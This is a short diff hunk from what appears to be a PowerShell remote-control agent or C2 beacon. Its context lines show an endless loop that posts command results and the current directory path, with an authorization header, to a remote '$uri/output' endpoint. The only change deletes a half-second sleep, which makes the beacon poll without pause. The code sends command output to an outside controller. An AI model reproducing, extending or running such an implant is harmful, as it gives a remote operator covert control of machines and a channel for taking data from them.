@@ -8,5 +8,4 @@ while ($true) {
         $path = Out-String -InputObject (Resolve-Path .\).Path
         Invoke-WebRequest -UseBasicParsing -Headers @{"Authorization" = $auth} -Uri $uri/output -Method POST -ContentType "application/json" -Body (@{"Content" = $command; "Path" = $path} | ConvertTo-Json)
     }
-    sleep 0.5
 }
